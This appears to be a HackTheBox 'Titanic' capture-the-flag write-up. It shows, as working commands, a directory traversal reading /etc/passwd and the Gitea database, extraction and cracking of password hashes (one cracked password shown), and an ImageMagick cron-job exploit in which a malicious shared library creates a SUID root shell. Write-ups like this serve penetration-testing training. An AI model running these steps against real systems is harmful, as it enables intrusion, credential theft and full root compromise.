---
title: "HackTheBox - Titanic"
author: Nasrallah
description: ""
date: 2025-06-27 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cronjob, gitea, directorytraversal, hashcat]
img_path: /assets/img/hackthebox/machines/titanic
image:
    path: titanic.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Titanic](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/titanic) from [HackTheBox](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/) starts with a website having it's source code on a gitea instance helping us discover a directory traversal. We exploit that retrieve the gitea db file and crack the found hashes. For root we exploit a cronjob running a vulnerable version of `Magick` and get a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.55
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found ssh and http running on an ubuntu machine.

Nmap scripts reveals the domain name `titanic.htb` for for 80, let's add it to `/etc/hosts` file.

### Web

Let's navigate to the web site on port 80.

![page](1.png)

There is no interesting information in this page, let's run a subdomain scan.

```terminal
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 407ms]
```

We found `dev` subdomain, let's add it to our `/etc/hosts` file and then navigate to it.

![gittea](2.png)

It's `gitea`, let's go to the explore page.

![explore](3.png)

We found two repositories, the flask-app sounds interesting, let's check it out.

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

On line 36 we find that the page `/download` takes a GET request with the parameter `ticket` which basically enables us to download file from the system.

Let's test it.

```bash
curl 'http://titanic.htb/download?ticket=/etc/passwd'
root:x:0:0:root:/root:/bin/bash              
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin   
[...]
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

We managed to read `/etc/passwd`.

I tried reading some files in `/proc/self` but didn't succeed, also the same with history files and ssh private keys.

### Gitea

Gitea uses a db file named `gitea.db` which is a sqlite database stored in `/gitea/gitea.db. But we need to know the location of the gitea install first.

Going to docker-config repository we find just that.

![install](4.png)

The config file reveals that gitea is in `/home/developer/gitea/data`. Now let's grab the db file

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

With the help of 0xdf's writeup on [compiled](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#) we can use the following command to extract the usernames and the crackable hashes in the database.

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```terminal
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Great, now let's crack the hashes.

```terminal
$ hashcat hashes.txt rockyou.txt -m 10900 --user
hashcat (v6.2.6) starting in autodetect mode
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

Developer's cracked to `25282528`

## **Foothold**

Let's ssh to the box.

```terminal
[★]$ ssh developer@titanic.htb                                                              
developer@titanic.htb's password:     
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: in**     from 10.10.14.152
developer@titanic:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
developer@titanic:~$ 
```

## **Privilege Escalation**

Navigating to the `/opt` directory we find scripts with the following bash script.

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

The script is using magick to inspect jpg images inside `/opt/app/static/assets/images`, it's also running as a cronjob.

Searching on google for exploits in magick we find a command execution vulnerability <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8>

To exploit this we need to run the following command which creates a shared library the `magick` will load when it's executed.

The library needs to be in the same directory where the `magick` runs which is `/opt/app/static/assets/images`, luckily for us we have write permissions there as user `developer`.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /home/developer/bash && chmod +s /home/developer/bash");
    exit(0);
}
EOF
```

![root](5.png)

## **References**

<https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
